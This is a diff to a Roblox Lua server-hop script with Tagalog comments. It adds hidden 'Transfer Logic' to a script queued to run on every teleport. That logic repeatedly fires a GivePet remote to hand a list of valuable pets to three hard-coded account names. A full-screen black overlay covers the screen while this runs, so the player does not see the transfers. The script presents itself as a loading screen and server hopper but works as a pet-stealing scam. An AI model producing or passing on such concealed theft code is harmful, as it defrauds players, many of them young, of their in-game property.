@@ -4,6 +4,7 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local placeId = 126884695634066
 
+-- GUI Script na lalabas kada serverhop
 local loadingScript = [[
 local Players = game:GetService("Players")
 local StarterGui = game:GetService("StarterGui")
@@ -24,7 +25,6 @@ screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 local bg = Instance.new("Frame", screenGui)
 bg.Size = UDim2.new(1, 0, 1, 0)
 bg.BackgroundColor3 = Color3.new(0, 0, 0)
-bg.BackgroundTransparency = 0
 bg.ZIndex = 999999
 
 local title = Instance.new("TextLabel", bg)
@@ -71,8 +71,36 @@ task.spawn(function()
     end
     screenGui:Destroy()
 end)
+
+-- Transfer Logic
+task.wait(3)
+
+local transferred = false
+local targets = {"boneblossom215", "beanstalk1251", "burningbud709"}
+local pets = {"Trex", "fennec fox", "Raccoon", "dragonfly", "butterfly", "queenbee", "spinosaurus", "redfox", "Brontosaurus", "mooncat", "mimic octopus", "disco bee", "dilophosaurus", "kitsune"}
+
+task.spawn(function()
+    while not transferred do
+        for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
+            for _, name in ipairs(targets) do
+                if player.Name == name then
+                    for _, pet in ipairs(pets) do
+                        pcall(function()
+                            game:GetService("ReplicatedStorage").GivePet:FireServer(pet, player)
+                        end)
+                    end
+                    transferred = true
+                    break
+                end
+            end
+            if transferred then break end
+        end
+        task.wait(5)
+    end
+end)
 ]]
 
+-- Function para mag hop ng server at i-queue yung script sa teleport
 local function serverHop()
     local cursor = ""
     local smallestServer = nil
@@ -109,4 +137,6 @@ local function serverHop()
     end
 end
 
+-- Execute hop + queue sa simula
+queue_on_teleport(loadingScript)
 serverHop()
